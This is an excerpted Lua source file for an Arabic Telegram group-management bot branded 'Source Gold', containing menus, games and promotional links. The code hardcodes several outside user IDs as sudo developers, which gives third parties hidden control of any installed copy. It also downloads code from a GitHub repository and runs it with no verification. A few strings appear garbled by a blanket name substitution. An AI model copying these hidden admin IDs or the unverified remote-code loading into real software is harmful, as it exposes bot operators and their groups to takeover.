...
io.write('\27[0;31m\n ارسل لي توكن البوت الان •━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━• :\na•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•\n التوكن غير صحيح تاكد منه ثم ارسله')
else
...
print('\27[0;35m•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي •━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━• :\na•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•\n\27[0;33;49m')
...
io.write('\27[1;31m •━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━• ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•━═━═『⌯︙ ɢᴏʟᴅ ⌯︙』═━═━•"
echo "TG IS NOT FIND IN FILES BOT"
echo "•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━• •━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•"
exit 1
fi
if [ ! $token ]; then
echo "•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━• •━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•"
...
token = sudos.token 
--- start functions •━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Gold-So/Iskandar/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1719061213,1751768178,1001132193,}   
...
if tonumber(user_id) == tonumber(1719061213) then  
var = true 
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'ديمون') 
local DRAGON_Msg = { 
...
if not DevSoFi(msg) then
local Text = [[
☏سعر التنصيب علي سورس ديمون
↯سعر التنصيب العادي 20جنيه فقط
☏للتواصل اتبع الازرار بالاسفل ⇓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ɢᴏʟᴅ',url="t.me/Dad_elShitan"}},
}
local msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '😍مطور السورس',url="t.me/Dad_elShitan"}}, 
...
local Text = ' ⌯︙تم ارسال الملصق من •━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•\n - '..Name
...
os.execute('wget https://raw.githubusercontent.com/Gold-So/Iskandar/main/DRAGON.lua')
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/aslak8/39&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' ⌯︙ اصدار سورس ديمون{ 3x☆}')
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Dad_elShitan/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '𖤍━┅┅┄⟞⟦𝚍𝚎𝚖𝚘𝚗⟧⟝┄┉┉━𖤍' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس ديمون ادخل وتابع الجديد](t.me/g_00_l_d)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'ɢᴏʟᴅ', url="t.me/g_00_l_d"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/g_00_l_d/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس ديمون ادخل وتابع الجديد](t.me/g_00_l_d)
]] 
keyboard = {}  
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/g_00_l_d/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ⌯︙ من أحسن السورسات على التليجرام سورس ديمون ⌯︙
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "ديمون")
...
{
{text = '⌯ 𝐅𝐚𝐜𝐭𝐨𝐭𝐲 𝐆𝐨𝐥𝐝 ⌯', url = "https://t.me/AK82_Bot"},{text = '⌯ 𝐓𝐰𝐚𝐬𝐨𝐥 ⌯', url = "https://t.me/Hdudbdbot"},
},
{
{text = '⌯ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐆𝐨𝐥𝐝 ⌯', url = "https://t.me/dv_gold"}
},
{
{text = '⌯ 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐆𝐨𝐥𝐝 ⌯', url = "https://t.me/g_00_l_d"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/aslak8/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'اسلام' or text == 'اسلام جولد' or text == 'مطور السورس' then
local Text = [[
مطور سورس جولد
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐢𝐬𝐥𝐚𝐦 𝐝𝐚𝐡𝐚𝐛',url="t.me/Amvggddghhgddsfhhfddhh"}},
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴', url="t.me/g_00_l_d"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Amvggddghhgddsfhhfddhh&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'تايجر' or text == 'رامي' or text == 'مالك السورس' then
local Text = [[
مالك سورس جولد لو حباب تتواصل معها اتبع الزر الي تحت👇
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙏𝙄𝙂𝙀𝙍',url="t.me/Dev_RE9"}},
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴', url="t.me/g_00_l_d"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Dev_RE9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'بوت التواصل' or text == 'التواصل' or text == 'تواصل السورس' then
local Text = [[
بوت التواصل
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'بوت التواصل',url="t.me/ToToS1bot"}},
{{text = '𝔰𝔬𝔲𝔯𝔠𝔢', url="t.me/g_00_l_d"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ToToS1bot&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == 'جافا' or text == 'عمرو' or text == '⌯ جــــــافــــــا ⌯' then
local Text = [[
𝐉.𝐚.𝐯.𝐚.!🇨🇼
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ᯓ˹ ᴊᴀᴠᴀ ᴇʟʜᴀᴋᴇʀ˼𖠱',url="t.me/JAI6H"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/UU_AK&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == '◈ 𝐓 𝐞 𝐚 𝐦 𝐆 𝐨 𝐋 𝐝 ◈' or text == 'مطورين السورس' or text == 'التسنن' then
local Text = [[
𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖦𝗈𝗅𝖽.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖦𝗈𝗅𝖽.',url="t.me/Dv_gold"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/aslak8/41&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'عبدالله' or text == 'عبدو' or text == 'مطور السورس2' then
local Text = [[
مطور سورس جولد
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ᯓ『 𝑨𝒃𝒅𝒐 | 𝑻𝒊𝒈𝒆𝒓 .✫』𓆃',url="t.me/DV_ABDO"}},
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴', url="t.me/g_00_l_d"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DV_ABDO&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
"لو خيروك |  بين تناول البيتزا وبين الآيس ديمون وذلك بشكل دائم؟ ",
...
"لو خيروك |  بين تنظيف شعرك بسائل غسيل الأطباق وبين استخدام ديمون الأساس لغسيل الأطباق؟ ",
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/g_00_l_d/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'الالعاب' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ⌯︙ اهلا في قائمه الالعاب المتطوره سورس ديمون ⌯︙ 
...
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/aslak8/38&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--------------------------------------------------------------------------------------------------------------
...
t = ' ⌯︙ ملفات السورس ديمون•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•\n •━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━• \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Gold-So/Iskandar/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ⌯︙ اهلا بك في متجر ملفات ديمون\n ⌯︙ ملفات السورس •━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•\n ⌯︙ علامة تعني { ✔️ } ملف مفعل\n ⌯︙ علامة تعني { ✖ } ملف معطل\n ⌯︙ قناة سورس ديمون•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•\n".." ⌯︙ [اضغط هنا لدخول](t.me/g_00_l_d) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Gold-So/Iskandar/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ⌯︙ عذرا الملف لايدعم سورس ديمون\n") 
end
return false
end
...
if text == ("مسح قائمه ديمون") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ⌯︙ تم مسح قائمه ديمون')
return false
end

if text == 'قائمه ديمون' and Sudo(msg) then
...
if text == ("رفع ديمون") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ديمون@(.*)$") and Sudo(msg) then
local username = text:match("^رفع ديمون@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ديمون(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع ديمون(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل ديمون") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ديمون@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل ديمون@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ديمون(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل ديمون(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
'\n❲[ɢᴏʟᴅ ](t.me/g_00_l_d)❳'..
'\n•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•'..
'\n ⌯︙ اعدادات الجروب كتالي ☆•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•'..
'\nء•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•'..
'\n ⌯︙  علامة ال {✓} تعني مفعل'..
'\n ⌯︙  علامة ال {✘} تعني معطل'..
'\nء•━═━═『⌯︙ 𝙏𝙀??𝙈 ɢᴏʟᴅ ⌯︙』═━═━•'..
...
' }\n'..' ⌯︙  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ⌯︙  الرفع  ⇇{ '..setadd..
' }\n'..' ⌯︙  الحظر  ⇇{ '..banm..' }\n\n ⌯︙═───═❲[ɢᴏʟᴅ ](t.me/g_00_l_d)❳═───═ ⌯︙\n ⌯︙ قناة سورس ديمون•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•\n [ ❲[ɢᴏʟᴅ ](t.me/g_00_l_d)❳](t.me/g_00_l_d) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•\nاضغط علي الاسم ليتم نسخه\n•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•ٴ\n ⌯︙ ❲[ɢᴏʟᴅ ](t.me/g_00_l_d)❳ ⌯︙ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'ديمون').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'ديمون')
local Dev_Ah8 = {
'ننعم يروحي 😻💙',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '《𝐒》𝗧??𝗮𝗺 𝚍𝚎𝚖𝚘𝚗', url="t.me/g_00_l_d"}},
}
local msg_id = msg.id_/2097152/0.5
...
end --الكود حصري سورس ديمونيعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ديمون').." غادر" or text == 'غادر' then  
...
if text == 'بوتي' then 
send(msg.chat_id_,msg.id_, '[قلب بوتكك من جواا 🥺♥️](t.me/Dahab_source)') 
return false
end
...
[[
🌨•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•Use ⇨ #username 🌨
🌨•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•iD ⇨ #id 🌨
🌨•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•Sta ⇨  #stast 🌨
🌨•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•Msg ⇨ #msgs 🌨
🌨•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•NaMe ⇨ #name  🌨
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
...
[[
↑•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•𝙐𝙎𝙀𝙍𝙉𝘼𝙈?? ➱ #username ⌯︙  
↑•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•𝙄𝘿 ➱ #id
↑•━═━═『⌯︙ 𝘼𝙇𝙀𝙓𝘼𝙉𝘿𝙀?? ⌯︙』═━═━•𝙍𝘼𝙉𝙆 ➱  #stast ⌯︙  
↑•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•𝙈𝘼𝙎𝙂 ➱ #msgs ⌯︙  
↑•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•𝗖𝗛 ➯  ↝@g_00_l_d↜ ⌯︙  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
𝟓 𝟔 𖡻 #msgs  ࿇🦄
...
local Text =[[
⚙️╖⁩ ❬1 ❭ اوامر حماية المجموعه ⇊
🥳╢ ❬2 ❭ اوامر التسليه ⇊
💫╢ ❬ 3 ❭ اوامر الاعضاء ⇊
👮‍♂️╢ ❬ 4 ❭ اوامر اصحاب الرتب ⇊
💎╜ ❬ 5 ❭ اوامر المطورين ⇊
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[ɢᴏʟᴅ ](t.me/g_00_l_d)❳ 
]]
...
{
{text = '•تــغــير الــلــغــه•', callback_data="/help911"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
local Text = [[
 ...
 تحت لي في الزر الأسفل•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•
...
{
{text = '˹《𝐒》𝐃??𝐌𝐎𝐍˼', url="t.me/g_00_l_d"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•
 اختر الامر الذي تريدها .↑•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•
ده من الازرار بلاسفل . •━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[ɢᴏʟᴅ ](t.me/g_00_l_d)❳ 
]]
keyboard = {} 
...
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•
 اختر العبه الذي تريدها .↑•━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•
ده من الازرار بلاسفل . •━═━═『⌯𝐒𝐨𝐮𝐫𝐜𝐞 𝐆𝐨𝐥𝐝 ⌯』═━═━•
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[ɢᴏʟᴅ ](t.me/g_00_l_d)❳ 
]]
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ديمون')
...
"‏صراحه  |  من هو الشخص الذي يأتي في قلبك بعد الله – سبحانه وتعالى- ورسوله الديمون – صلى الله عليه وسلم؟",
